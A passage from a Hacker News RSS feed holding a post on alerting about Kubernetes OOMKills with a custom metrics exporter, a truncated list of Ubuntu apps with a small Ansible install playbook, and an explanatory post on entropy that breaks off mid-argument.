I1120 22:04:21.572066       1 main.go:64] Starting prometheus metrics</code></pre> <p>As it seems no one has committed any code to in over a year. It has a low number of stars (14). All that meant that I was back to square one.</p> <h2>Rolling my Own: <code>missing-container-metrics</code></h2> <p>Having a hard time finding an existing solution meant only one thing: I will have to write my own.</p> <p>A cursory look at <a href="https://docs.docker.com/engine/reference/commandline/events/" rel="nofollow">Docker’s events</a> delivered everything I needed. There is an event called <code>oom</code>. Docker emits this event every time the OOMKiller process gets active in the container. Now I was only missing a piece of code that will listen to those events and export them as Prometheus metrics.</p> <p>This is how <a href="https://github.com/draganm/missing-container-metrics" rel="nofollow">missing-container-metrics</a> was born. What it does is to connect to a local Docker instance (via <code>/var/run/docker.sock</code>). It lists all existing containers as a starting point. And then it listens to Docker events. Using those events, it keeps track of the currently running containers. It also gathers the basic stats of each container it knows about:</p> <ul><li>Number of restarts</li> <li>Last exit code</li> <li>Number of OOMKills</li></ul> <p>By design, it is not Kubernetes specific. This means it can be used with a plain Docker. But it also has a couple of very convenient Kubernetes specific features.</p> <p>Whenever it finds a container label for the pod name or namespace, it adds them as a label to the exported metrics. Also, label naming is compatible with <code>kube-state-metrics</code>.</p> <p>This keeps things simple for metric joins in PromQL.</p> <h2>Running it in the Cluster</h2> <p>In a Kubernetes cluster, <code>missing-container-metrics</code> needs to run on every node. The simplest way to achieve this is to use a daemon-set. The source code comes with an example <a href="https://github.com/draganm/missing-container-metrics#kubernetes" rel="nofollow">daemon set</a> deployment.</p> <h2>An Interesting Find Using <code>missing-container-metrics</code></h2> <p>The most interesting issue I’ve found was where I’ve least expected it: Fluentd!</p> <p>Fluentd log forwarder for node/pod/kubelet logs to the log aggregator. When the volume of logs was very high, Fluentd is OOMKilled.</p> <p>Looking at the details of how Fluentd works, it becomes clear what is going on.</p> <p>Fluentd has one main process (that ends up being init process in the container). This main process forks a worker process that forwards the logs. When the worker process dies for some reason (for example OOMKill), the main process starts a new one. This leads to an endless loop of spawn/OOMKill.</p> <p>The fact that Fluentd is the log forwarder is very unfortunate. OOMKill loop would stop the log forwarding, so you could not ‘see’ what is going on by inspecting the logs.</p> <h2>Epilogue</h2> <p>If you want to make sure that your Kubernetes cluster is healthy, it is essential to alert on OOMKills. This enables you to know when processes hit their memory limits. Be it because of memory leaks or wrongly configured memory limits.</p> <p>It turns out that monitoring for OOMKills in Kubernetes is not as an easy task as one might think. Using <a href="https://github.com/draganm/missing-container-metrics" rel="nofollow">missing-container-metrics</a> makes it much easier though.</p> <p>So go ahead, deploy <a href="https://github.com/draganm/missing-container-metrics" rel="nofollow">missing-container-metrics</a> to your cluster. You might be surprised how many of OOMKills you have not been noticing.</p> <p>I hope that it will be useful to you, and will save you the time that I’ve spent searching for the solution.</p></article></div>]]>
            </description>
            <link>https://www.netice9.com/blog/guide-to-oomkill-alerting-in-kubernetes-clusters</link>
            <guid isPermaLink="false">hacker-news-small-sites-25192733</guid>
            <pubDate>Mon, 23 Nov 2020 22:31:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Minimalist versions of basic phone apps]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25192172">thread link</a>) | @mortenjorck
<br/>
November 23, 2020 | https://lil.software/os/ | <a href="https://web.archive.org/web/*/https://lil.software/os/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://lil.software/os/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25192172</guid>
            <pubDate>Mon, 23 Nov 2020 21:30:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Things to install on a Fresh Ubuntu install]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25192083">thread link</a>) | @Mightywomble
<br/>
November 23, 2020 | https://tech.davidfield.co.uk/20-things-i-install-on-a-fresh-ubuntu-install/ | <a href="https://web.archive.org/web/*/https://tech.davidfield.co.uk/20-things-i-install-on-a-fresh-ubuntu-install/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://tech.davidfield.co.uk/content/images/size/w300/2020/11/OpenHeavyFlyingfox-size_restricted.gif 300w,
                            https://tech.davidfield.co.uk/content/images/size/w600/2020/11/OpenHeavyFlyingfox-size_restricted.gif 600w,
                            https://tech.davidfield.co.uk/content/images/size/w1000/2020/11/OpenHeavyFlyingfox-size_restricted.gif 1000w,
                            https://tech.davidfield.co.uk/content/images/size/w2000/2020/11/OpenHeavyFlyingfox-size_restricted.gif 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://tech.davidfield.co.uk/content/images/size/w2000/2020/11/OpenHeavyFlyingfox-size_restricted.gif" alt="20 Things to install on a Fresh Ubuntu install">
            </figure>

            <section>
                <div>
                    <p>The internet is full of these lists where each time an Ubuntu release is launched, they are re branded with the new release name and number and shipped out. So what makes this list different?</p><p>Firstly almost all of these lists have the same apps on them, these are not necessary the best out there, or what you need and in many examples won't even give you the best experience you can get.</p><p>This is a list created by someone who actually uses Ubuntu as a daily driver and I use these apps daily.</p><p><strong>Updates</strong></p><ul><li>Swapped vscode for vscodium</li><li>Updated Hiri information</li><li>Added information on Bpytop as a Bashtop port.</li><li>Spotted some more spelling mistakes</li></ul><h2 id="the-list">The List</h2><h3 id="1-bluemail-free-">1. BlueMail (Free)</h3><figure><a href="https://www.bluemail.me/"><div><p>BlueMail - The Best Email Management App for Windows, Mac, Linux, Android, and iOS</p><p>BlueMail is a modern, mobile first, powerful Email management tool with a sleek design, unified inbox and support for all your accounts: IMAP,Exchange,POP3.</p><p><img src="https://www.bluemail.me/img/mini-logo.png"><span>BlueMail</span></p></div><p><img src="https://bluemail.me/img/BM_Twitter_Card.png"></p></a></figure><p>Bluemail is an app I used on android for many years and recently i've started using it on Ubuntu. Its a great app if you have multiple mail accounts across multiple platforms as it has support for almost all the major mail platforms and provides views in either per mailbox or as a unified view.</p><p>Until recently it was also one of the few mail clients on Ubuntu which supported Google with Advanced security mode enabled. (At the time of writing a bug has stopped this, however Bluemail have responded that they are looking into it)</p><figure><img src="https://tech.davidfield.co.uk/content/images/2020/11/Bluemail-Linux-Application-Dark-Mode.png" alt="" srcset="https://tech.davidfield.co.uk/content/images/size/w600/2020/11/Bluemail-Linux-Application-Dark-Mode.png 600w, https://tech.davidfield.co.uk/content/images/size/w1000/2020/11/Bluemail-Linux-Application-Dark-Mode.png 1000w, https://tech.davidfield.co.uk/content/images/2020/11/Bluemail-Linux-Application-Dark-Mode.png 1434w" sizes="(min-width: 720px) 720px"></figure><p>The interface also has a dark mode which works really well with (K)ubuntu dark themes.</p><h3 id="2-nemo-free-">2. Nemo (Free)</h3><figure><a href="https://itsfoss.com/install-nemo-file-manager-ubuntu/"><div><p>How to Install and Make Nemo the Default File Manager in Ubuntu</p><p>This tutorial shows you how to install and use Nemo file manager in Ubuntu. You can also make Nemo the default file manager instead of Nautilus.</p><p><img src="https://i1.wp.com/itsfoss.com/wp-content/uploads/2017/06/cropped-Logo-redsigned-without-name.png?fit=192%2C192&amp;ssl=1"><span>It's FOSS</span></p></div><p><img src="https://i0.wp.com/itsfoss.com/wp-content/uploads/2013/06/Nemo-File-Icons.jpeg?fit=600%2C324&amp;ssl=1"></p></a></figure><p>As someone who prefers using KDE to Gnome and one fo the reasons for that preference is Dolphin as KDE's File manager. I always find Nautilus so underwhelming on Gnome.</p><p>One of the first things I do is set Nemo as the default file manager.</p><figure><img src="https://tech.davidfield.co.uk/content/images/2020/11/nemo.png" alt="" srcset="https://tech.davidfield.co.uk/content/images/size/w600/2020/11/nemo.png 600w, https://tech.davidfield.co.uk/content/images/size/w1000/2020/11/nemo.png 1000w, https://tech.davidfield.co.uk/content/images/2020/11/nemo.png 1366w" sizes="(min-width: 720px) 720px"></figure><p>As well as providing a fuller featured experience Nemo also has a quite nice plugins architecture and the two pane view is also a nice feature.</p><h3 id="3-standard-notes-free-paid-">3. Standard Notes (Free/Paid)</h3><figure><a href="https://standardnotes.org/"><div><p>Standard Notes | A Simple And Private Notes App</p><p>Standard Notes is a private notes app that features unmatched simplicity, end-to-end encryption, powerful extensions, and open-source applications.</p><p><img src="https://standardnotes.org/assets/favicon/apple-touch-icon-f78f0771e813c3391b1468e6bfe2bd61ea49e96d7dc5649fc0a80de023086000.png"><span>Standard Notes | A Simple And Private Notes App</span></p></div><p><img src="https://s3.amazonaws.com/standard-notes/media/SN-Icon-500.png"></p></a></figure><p>I take a lot of notes and the primary thing i want my notes to be is available on any platform I use. Standard notes does this. It syncs to the cloud as an encrypted blog, supports 2FA login, loads of plugins (Paid version) which add different editors, dark themes and much more</p><figure><img src="https://tech.davidfield.co.uk/content/images/2020/11/standard-notes-tile.jpg" alt="" srcset="https://tech.davidfield.co.uk/content/images/size/w600/2020/11/standard-notes-tile.jpg 600w, https://tech.davidfield.co.uk/content/images/size/w1000/2020/11/standard-notes-tile.jpg 1000w, https://tech.davidfield.co.uk/content/images/2020/11/standard-notes-tile.jpg 1089w" sizes="(min-width: 720px) 720px"></figure><p>the Search engine within the application is really good and using hashtags to group notes works really well</p><h3 id="4-hiri-trial-paid-">4. Hiri (Trial/Paid)</h3><figure><a href="https://www.hiri.com/"><div><p>Hiri best email client for Windows, Mac and Linux</p><p>Hiri is the best email client for Managers on Windows, Mac and Linux.</p><p><img src="https://hiriwebsitestatic.s3.amazonaws.com/hiri/images/index.ico"></p></div><p><img src="https://hiriwebsitestatic.s3.amazonaws.com/accounts/images/hiri_logo_no_ds.png"></p></a></figure><p>Hiri is a mail app specifically for Outlook/Exchange accounts and is a well thought out mail client. If you're looking for something to separate work and home email and you use Office365 this is a good client to use.</p><figure><img src="https://tech.davidfield.co.uk/content/images/2020/11/Hiri_inbox_screenshot.png" alt="" srcset="https://tech.davidfield.co.uk/content/images/size/w600/2020/11/Hiri_inbox_screenshot.png 600w, https://tech.davidfield.co.uk/content/images/size/w1000/2020/11/Hiri_inbox_screenshot.png 1000w, https://tech.davidfield.co.uk/content/images/size/w1600/2020/11/Hiri_inbox_screenshot.png 1600w, https://tech.davidfield.co.uk/content/images/size/w2400/2020/11/Hiri_inbox_screenshot.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>As well as the standard pen there are several plugins available which can do things like add a task list, splitting mails into fyi and important, help with subject lines and even stop you looking at the client so often.</p><blockquote><strong>Note: </strong>It was pointed out that this code has not been updated since 2018. Personally i've found no bugs in it and have used it for over a year. However some will consider this abandonware.</blockquote><h3 id="5-hyper-free-">5. Hyper (Free)</h3><figure><a href="https://hyper.is/"><div><p>Hyper™</p><p>A terminal built on web technologies</p><p><img src="https://hyper.is/apple-touch-icon-152x152.png"></p></div><p><img src="https://assets.vercel.com/image/upload/v1590627842/hyper/og-image-3.png"></p></a></figure><p>If Nemo is a step up from Nautilus then I find Hyper to be the same step up from Gnome Terminal</p><figure><img src="https://tech.davidfield.co.uk/content/images/2020/11/Hyper-Linux-Terminal-App.png" alt="" srcset="https://tech.davidfield.co.uk/content/images/size/w600/2020/11/Hyper-Linux-Terminal-App.png 600w, https://tech.davidfield.co.uk/content/images/2020/11/Hyper-Linux-Terminal-App.png 773w" sizes="(min-width: 720px) 720px"></figure><p>Adding features such as Themes and plugins to improve the experience and being configured using basically code Hyper gives a good smooth Terminal experience.</p><h3 id="6-vscodium-free-">6. VSCodium (Free)</h3><figure><a href="https://vscodium.com/"><div><p>VSCodium - Open Source Binaries of VSCode</p><p>Free/Libre Open Source Software Binaries of VSCode</p><p><img src="https://vscodium.com/img/apple-touch-icon.png"><span>Open Source Binaries of VSCode</span></p></div><p><img src="https://vscodium.com/img/vscodium.png"></p></a></figure><p>When Microsoft released Visual Studio code they hit a home run. As an editor for those day to day tasks or an advanced IDE this is a great application for almost any workflow where you are dealing with code</p><figure><img src="https://tech.davidfield.co.uk/content/images/2020/11/58344409-70473b80-7e0a-11e9-8570-b2efc6f8fa44.png" alt="" srcset="https://tech.davidfield.co.uk/content/images/size/w600/2020/11/58344409-70473b80-7e0a-11e9-8570-b2efc6f8fa44.png 600w, https://tech.davidfield.co.uk/content/images/size/w1000/2020/11/58344409-70473b80-7e0a-11e9-8570-b2efc6f8fa44.png 1000w, https://tech.davidfield.co.uk/content/images/size/w1600/2020/11/58344409-70473b80-7e0a-11e9-8570-b2efc6f8fa44.png 1600w, https://tech.davidfield.co.uk/content/images/2020/11/58344409-70473b80-7e0a-11e9-8570-b2efc6f8fa44.png 2158w" sizes="(min-width: 720px) 720px"></figure><p>Providing a huge library of extensions to do almost anything with your code, to the SCM integration with Git. The continuous monthly updates. VS Code is a well thought out editor. Now Consider all of that but with a code base that removed the telemetry and feedback to Microsoft. Thats VSCodium. It is a community-driven, freely-licensed binary distribution of Microsoft’s editor VSCode</p><h3 id="7-termius-free-paid-">7. Termius (Free/Paid)</h3><figure><a href="https://termius.com/"><div><p>Termius - SSH platform for Mobile and Desktop</p><p>The #1 cross-platform terminal for Windows, macOS, Linus, iOS, and Android with built-in ssh client which works as your own portable server management system in any situation.</p><p><img src="https://assets.website-files.com/5c7036349b5477bf13f828cf/5d69010245243070dcc538d6_termius-icon%401x.png"><span>SSH platform for Mobile and Desktop</span></p></div><p><img src="https://assets.website-files.com/5c7036349b5477bf13f828cf/5cc7dff32d982e28cd8e99f3_termius_fb_logo.png"></p></a></figure><p>To say Termius is "just a remote terminal" is so far away from what this application is. There is a free and a paid version, and this is one of those applications its worth stumping up the cash for.</p><figure><img src="https://tech.davidfield.co.uk/content/images/2020/11/5ee98fcc9bc7df9d4b8f99d2_desktop_preview.png" alt="" srcset="https://tech.davidfield.co.uk/content/images/2020/11/5ee98fcc9bc7df9d4b8f99d2_desktop_preview.png 600w"></figure><p>Firstly its cross platform, Linux, android, chromebook, Windows Mac Termius has it all covered. It also does this using a secure back end, which means those keys and connections you setup on your desktop are immediately available when you install it on another platform. A customizable experience from fonts and sizes to colours of the theme this is a very click app if you're using SSH to connect to remote hosts.</p><h3 id="8-onlyoffice-desktop-free-">8. OnlyOffice Desktop (Free)</h3><figure><a href="https://www.onlyoffice.com/en/download-desktop.aspx"><div><p>ONLYOFFICE desktop and mobile apps</p><p>Download free ONLYOFFICE document editors for your desktop and mobile devices</p><p><img src="https://static-www.onlyoffice.com/v9.5.0/images/fb_icon_325x325.png"></p></div><p><img src="https://download.onlyoffice.com/assets/fb/fb_icon_325x325.jpg"></p></a></figure><p>Another application where apps like Libreoffice are gushed over, where I feel they are over represented and lagging in so many areas. Step up then Only Office one of the best MS Office alternatives for daily use i've come across.</p><figure><img src="https://tech.davidfield.co.uk/content/images/2020/11/onlyoffice-text-editor.jpg" alt="" srcset="https://tech.davidfield.co.uk/content/images/size/w600/2020/11/onlyoffice-text-editor.jpg 600w, https://tech.davidfield.co.uk/content/images/2020/11/onlyoffice-text-editor.jpg 940w" sizes="(min-width: 720px) 720px"></figure><p>Supporting Office fully only office provides an interface for Documents, presentations and spreadsheets. It also has a secret up its sleeve because while MS Office integrates well with Office365 (or whatever its called this week) Only office is able to integrate with NextCloud so you can open and edit documents directly from your NextCloud server.</p><h3 id="9-whatsdesk-free-">9. WhatsDesk (Free)</h3><figure><a href="https://gitlab.com/zerkc/whatsdesk"><div><p>Gustavo Gonzalez / whatsdesk</p><p>GitLab.com</p><p><img src="https://assets.gitlab-static.net/assets/touch-icon-ipad-retina-8ebe416f5313483d9c1bc772b5bbe03ecad52a54eba443e5215a22caed2a16a2.png"><span>GitLab</span></p></div><p><img src="https://assets.gitlab-static.net/uploads/-/system/project/avatar/7279732/logo.png"></p></a></figure><p>While there is no WhatsApp client on Linux there are plenty of alternative clients. Having used a few I find on my setup WhatsDesk to be stable and work really quite well</p><figure><img src="https://tech.davidfield.co.uk/content/images/2020/11/whatsapp-desktop-client-on-linux.jpg" alt="" srcset="https://tech.davidfield.co.uk/content/images/size/w600/2020/11/whatsapp-desktop-client-on-linux.jpg 600w, https://tech.davidfield.co.uk/content/images/2020/11/whatsapp-desktop-client-on-linux.jpg 800w" sizes="(min-width: 720px) 720px"></figure><p>Its stable, functional and looks a little as you'd expect a WhatApp client to.</p><h3 id="10-bashtop-free-">10. Bashtop (Free)</h3><figure><a href="https://github.com/aristocratos/bashtop"><div><p>aristocratos/bashtop</p><p>Linux/OSX/FreeBSD resource monitor. Contribute to aristocratos/bashtop development by creating an account on GitHub.</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>aristocratos</span><span>GitHub</span></p></div><p><img src="https://avatars2.githubusercontent.com/u/59659483?s=400&amp;v=4"></p></a></figure><p>The Top command is without doubt a useful command on any linux distro, and most list like these would suggest installing htop which takes top to another level. </p><figure><img src="https://tech.davidfield.co.uk/content/images/2020/11/main.png" alt="" srcset="https://tech.davidfield.co.uk/content/images/size/w600/2020/11/main.png 600w, https://tech.davidfield.co.uk/content/images/size/w1000/2020/11/main.png 1000w, https://tech.davidfield.co.uk/content/images/2020/11/main.png 1115w" sizes="(min-width: 720px) 720px"></figure><p>My recommendation is Bashtop, which like Htop has plenty of options for you to view what is going on on your system from a command line tool. However Bashtop displays its information in a much more useful way.</p><p>As advised on Reddit the Bashtop command has been ported to Python as bpytop</p><figure><a href="https://github.com/aristocratos/bpytop"><div><p>aristocratos/bpytop</p><p>Linux/OSX/FreeBSD resource monitor. Contribute to aristocratos/bpytop development by creating an account on GitHub.</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>aristocratos</span><span>GitHub</span></p></div><p><img src="https://repository-images.githubusercontent.com/276444578/c62f6d00-d4fe-11ea-9fb7-662e786b7baa"></p></a></figure><p>There are touted a few extra features, less memory use and a mouse driven menu system (which i can't seem to find). Also to install this on Ubuntu from a 3rd party repo the instructions can be found here</p><figure><a href="http://packages.azlux.fr/"><div><p>About | Azlux’s repository</p><p><img src="http://packages.azlux.fr/favicon.ico"><span>Azlux's repository</span></p></div></a></figure><h3 id="11-ansible-free-">11. Ansible (Free)</h3><figure><a href="https://www.ansible.com/"><div><p>Ansible is Simple IT Automation</p><p>Ansible is the simplest way to automate apps and IT infrastructure. Application Deployment + Configuration Management + Continuous Delivery.</p><p><img src="https://www.ansible.com/hs-fs/hub/330046/file-448313641.png"><span>Ansible, Red Hat</span></p></div><p><img src="https://www.ansible.com/hubfs/Images/Red-Hat-Ansible_OG_1200x630.png"></p></a></figure><p>Ansible isn't an Application its a language, one that is used to automate tasks, its widely adopted and simple enough for even someone like me to get to grips with and automate tasks.</p><p>At its simplest level Ansible can be used to install things onto your system and make sure each time they are installed it is done the same way</p><!--kg-card-begin: markdown--><pre><code>---
 - hosts: 127.0.0.1
   become: yes
   vars:
    user:
      - name: "david"
    packages:
      - telegram-desktop
      - termius-app
      - whatsdesk
      - mysql-workbench-community
      - glimpse-editor
      - hiri
      - standard-notes
      - drawio

  tasks:
    - name: Install Snap Packages - Base
      snap:
        name: "{{ packages }}"
        state: present
    - name: All done!
      debug:
        msg: Packages have been successfully installed
</code></pre>
<!--kg-card-end: markdown--><p>There is a lot more that can be bone with Ansible, a LOT more however this is a simple place to start. Some have mentioned this is "really a sysadmin tool" however i'd disagree only because its quick and easy to pick up and if you do a lot of laptop rebuilds as you find the right distro for you or you would like to learn how to automate some tasks in Ubuntu then this is a quick, simple language to learn.</p><h3 id="12-fish-free-">12. Fish (Free)</h3><figure><a href="https://fishshell.com/"><div><p>fish shell</p><p>A smart and user-friendly command line shell</p><p><span>ridiculous_fish</span></p></div><p><img src="https://fishshell.com/assets/img/Terminal_Logo2_CRT_Flat.png"></p></a></figure><p>The Friendly interactive shell is a replacement for Bash on your Ubuntu based system. And much like Nemo, Bashtop and Hyper before it takes what is offered by the base install and enhances it.</p><figure><img src="https://tech.davidfield.co.uk/content/images/2020/11/fish-shell.jpg" alt="" srcset="https://tech.davidfield.co.uk/content/images/size/w600/2020/11/fish-shell.jpg 600w, https://tech.davidfield.co.uk/content/images/2020/11/fish-shell.jpg 800w" sizes="(min-width: 720px) 720px"></figure><p>Out of the box and launched fish supports powerful features like <strong>syntax</strong> highlighting, autosuggestion, and tab completions that just work, with nothing to learn or configure. Taking the Auto completion as an example this isn't the same as the bash tab completion in the standard Ubuntu shell. </p><figure><img src="https://tech.davidfield.co.uk/content/images/2020/11/TabSuggestions.png" alt="" srcset="https://tech.davidfield.co.uk/content/images/size/w600/2020/11/TabSuggestions.png 600w, https://tech.davidfield.co.uk/content/images/2020/11/TabSuggestions.png 640w"></figure><p>Fish takes this to a new level.</p><h3 id="13-netdata-free-">13. Netdata (Free)</h3><figure><a href="https://www.netdata.cloud/"><div><p>Netdata - Monitor everything in real time for free with Netdata</p><p>Open-source, distributed, real-time, performance and health monitoring for systems and applications. Instantly diagnose slowdowns and anomalies in your infrastructure with thousands of …</p></div></a></figure></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tech.davidfield.co.uk/20-things-i-install-on-a-fresh-ubuntu-install/">https://tech.davidfield.co.uk/20-things-i-install-on-a-fresh-ubuntu-install/</a></em></p>]]>
            </description>
            <link>https://tech.davidfield.co.uk/20-things-i-install-on-a-fresh-ubuntu-install/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25192083</guid>
            <pubDate>Mon, 23 Nov 2020 21:22:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Demystifying the second law of thermodynamics]]>
            </title>
            <description>
<![CDATA[
Score 45 | Comments 30 (<a href="https://news.ycombinator.com/item?id=25191832">thread link</a>) | @akakievich
<br/>
November 23, 2020 | https://erischel.com/demystifying-the-second-law-of-thermodynamics/ | <a href="https://web.archive.org/web/*/https://erischel.com/demystifying-the-second-law-of-thermodynamics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <main id="main">
        




<i data-feather="calendar"></i> <time datetime="2020-11-22">Nov 22, 2020</time>

  <br>
  <i data-feather="tag"></i>
  
  
  <a href="https://erischel.com/tags/physics">physics</a>
  
  
  <a href="https://erischel.com/tags/math">math</a>
  

<p>Thermodynamics is really weird. Most people have probably encountered a bad explanation of the basics at some point in school, but probably don’t remember more than</p>
<ul>
<li>Energy is conserved</li>
<li>Entropy increases</li>
<li>There’s something called the ideal gas law/ideal gas equation.</li>
</ul>
<p>Energy conservation is not very mysterious. Apart from some weirdness around defining energy in general, it’s just a thing you can prove from whatever laws of motion you’re using.</p>
<p>But <em>entropy</em> is very weird. You’ve heard that it measures “disorder” in some vague sense.
Maybe you’ve heard that it’s connected to the <a href="https://en.wikipedia.org/wiki/Entropy%5F(information%5Ftheory)">Shannon entropy</a> of a probability distribution \(H(p) = \sum_x - p(x)\ln p(x)\).
Probably the weirdest thing about it is the law it obeys: It’s not conserved, but rather it <em>increases</em> with time.
This is more or less the only law like that in physics.</p>
<p>It gets even weirder when you consider that at least classical Newtonian physics is <em>time-symmetric</em>.
Roughly speaking, this means if you have a movie of things interacting under the laws of Newton, and you play it backwards, they’re still obeying the laws of Newton. An orbiting moon just looks like it’s orbiting in the other direction, which is perfectly consistent. A stone which is falling towards earth and accelerating looks like it’s flying away from earth and decelerating - exactly as gravity is supposed to do.</p>
<p>But if there’s some “entropy” quality out there that only increases, then that’s obviously impossible! When you played the movie backwards, you’d be able to tell that entropy was decreasing, and if entropy always increases, some law is being violated.
So what, is entropy some artefact of quantum mechanics? No, as it turns out. Entropy is an artefact of the fact that you can’t measure all the particles in the universe at once. And the fact that it seems to always increase is a consequence of the fact that matter is stable at large scales.</p>
<p>The points in this post are largely from E.T. Jaynes' <a href="https://bayes.wustl.edu/etj/articles/macroscopic.prediction.pdf">Macroscopic Prediction</a>.</p>
<h2 id="a-proof-that-entropy-doesn-t-always-increase">A proof that entropy doesn’t always increase</h2>
<p>Let \(X\) be the set of states of some physical system. Here I will assume that there is a finite number of states and time advances in discrete steps - there is some function \(T: X \to X\) which steps time forward one step. We assume that these dynamics are time-reversible in the weak sense that \(T\) is a bijection - every state is the future of exactly one “past” state.
Let \(S: X \to \mathbb{R}\) be some function. Assume \(S(x) \leq S(Tx)\) - in other words, \(S\) can never decrease.
Then \(S\) is constant, i.e \(S(x) = S(Tx)\).</p>
<p>Proof: Assume for contradiction \(S(x) &lt; S(Tx)\) for some \(x\). Since \(X\) is finite, let \(\sum_x S(x)\) be the sum of \(S\) over all states. Then clearly \(\sum_x S(x) = \sum_x S(Tx)\), since \(Tx\) just ranges over all the \(x\)s.
But on the other hand, we have \(S(x) \leq S(Tx)\) for all \(x\), and \(S(x) &lt; S(Tx)\) in at least one case. So we must have \(\sum_x S(x) &lt; \sum_x S(Tx)\) - contradiction.</p>
<p>This proof can be generalized to the continuous time and space case without too much trouble, for the types of dynamics that actually show up in physics (using <a href="https://en.wikipedia.org/wiki/Liouville%27s%5Ftheorem%5F(Hamiltonian)">Liouville’s Theorem</a>). The proof above still requires a <em>bounded</em> phase volume (corresponding to the finiteness of \(X\)). To generalize to other situations we need some more assumptions - the easiest thing is to assume that the dynamics are time-reversible in a stronger sense, and that this is compatible with the entropy in some way.</p>
<p>(You can find easy counterexamples in general, e.g. if \(X=\mathbb{Z}\) and the dynamics are \(T(x) = x+1\), then obviously we really do have that \(S(x) =x\) is increasing. Nothing to do about that.)</p>
<p>Anyways the bounded/finite versions of the theorems do hold for a toy thermodynamic system like particles in a (finite) box - here the phase volume really is bounded.</p>
<h2 id="the-true-meaning-of-entropy">The true meaning of entropy</h2>
<p>Okay, so what the hell is going on? Did your high school physics textbook lie to you about this?
Well, yes. But you’re probably never going to observe entropy going down in your life, so you can maybe rest easy.</p>
<p>Let \(X\) be the physical system under consideration again. But suppose now that we can’t observe \(x \in X\), but only some “high-level description \(p(x) \in Y\). Maybe \(x\) is the total microscopic state of every particle in a cloud of gas - their position and momentum - while \(p(x)\) is just the average energy of the particles (roughly corresponding to the temperature).
\(x\) is called a <em>microstate</em> and \(y = p(x)\) is called a <em>macrostate</em>.
Then the <em>entropy</em> of \(y \in Y\) is \(S(y) = \ln (p^{-1}(\{y\})\) - the logarithm of the number of microstates \(x\) where \(p(x) = y\). We say these are the microstates that <em>realize</em> the macrostate \(y\).</p>
<p>The connection with Shannon entropy is now that this is exactly the Shannon entropy of the uniform distribution over \(p^{-1}(y)\). This is the distribution you should have over microstates if you know nothing except the microstate.
In other words, the entropy measures your uncertainty about the microstate given that you know nothing except the macrostate.</p>
<p>There are more sophisticated versions of this definition in general, to account for the fact that</p>
<ul>
<li>In general, your microstates are probably sets of real numbers, and there are probably infinitely many compatible with the macrostate, so we need a notion of “continuous entropy” (usually called differential entropy, I think)</li>
<li>Your measurement of the macrostate is probably not that certain (but this turns out to matter surprisingly little for thermodynamic systems),</li>
</ul>
<p>but this is the basic gist.</p>
<h2 id="why-entropy-usually-goes-up">Why entropy usually goes up</h2>
<p>Okay, so why does entropy go up?
<em>Because there are more high-entropy states than low-entropy states</em>. That’s what entropy <em>means</em>.
If you don’t know anything about what’s gonna happen to \(x\) (in reality, you usually understand the dynamics \(T\) themselves, but have absolutely no information about \(x\) except the macrostate), it’s more likely that it will transfer to a macrostate with a higher number of representatives than to one with a low number of representatives.</p>
<p>This also lets us defuse our paradox from above. In reality, entropy doesn’t go down for literally every microstate \(x\).
It’s not true that \(S(p(Tx)) &gt; S(p(x))\) for all \(x\) - I proved that impossible above.
What <em>can</em> be true is this: given a certain macrostate, it’s more probable that entropy increases than that it decreases.</p>
<p>We can consider an extreme example where we have two macrostates \(L\) and \(H\), corresponding to low and high entropy.
Clearly the number of low-entropy states that go to a high-entropy state is exactly the same as the number of high-entropy states that go to a low-entropy state. That’s combinatorics.
But the <em>fraction</em> of low-entropy states that go to high-entropy is then necessarily larger than the fraction of high-entropy states that go to low-entropy states.</p>
<p>In other words, \(P(H(x_{t+1})|L(x_t)) &gt; P(L(x_{t+1})|H(x_t))\)</p>
<h2 id="why-entropy--almost--always-goes-up">Why entropy (almost) always goes up</h2>
<p>Okay, but that’s a lot weaker than “entropy always increases”! How do we get from here to there?
I could say some handwavy stuff here about how the properties of thermodynamic systems mean that the differences in the number of representatives between high-entropy and low-entropy states are massive - and that means the right-hand probability above can’t possibly be non-neglible. And that in general this works out so that entropy is almost guaranteed to increase.</p>
<p>But that’s very unsatisfying. It just happened to work out that way? I have a much more satisfying answer: entropy almost always increases because matter is stable at large scales.</p>
<p>Wait, what? What does that mean?</p>
<p>By “matter is stable at large scales”, I mean that the macroscopic behaviour of matter is predictable only from macroscopic observations. When a bricklayer builds a house, they don’t first go over them with a microscope to make sure the microstate of the brick isn’t going to surprise us later. And as long as we know the temperature and pressure of a gas, we can pretty much predict what will happen if we compress it with a piston.</p>
<p>What this means is that, if \(p(x) = p(x')\), then <em>with extremely high probability</em>, \(p(Tx) = p(Tx')\). It might not be literally certain, but it’s sure enough.</p>
<p>Now, let’s say we’re in the macrostate \(y\). Then there is some macrostate \(y'\) which is <em>extremely likely</em> to be the next one. For very nearly all \(x\) so that \(p(x) = y\), we have \(p(Tx) = y'\).
But this means that \(y'\) must have at least that many microstates representing it, since \(T\) is a bijection.
So the entropy of \(y'\) can at most be a <em>tiny</em> bit smaller than the entropy of \(y\) - this difference would be as tiny as the fraction of \(x\) with \(p(Tx) \neq y'\), so we can ignore it.</p>
<p>So unless something super unlikely happens and \(p(Tx) \neq y'\), entropy goes up.</p>
<p>By the way, this also explains what goes wrong with time-reversibility, and why in reality, you can easily tell that a video is going backwards. The “highly probably dynamics” \(Y \to Y\), which takes each macrostate the the most probable next state, don’t have to be time-reversible. For instance, let’s return to the two-macrostate system above.
Suppose that with 100% certainty, low-entropy states become high-entropy.
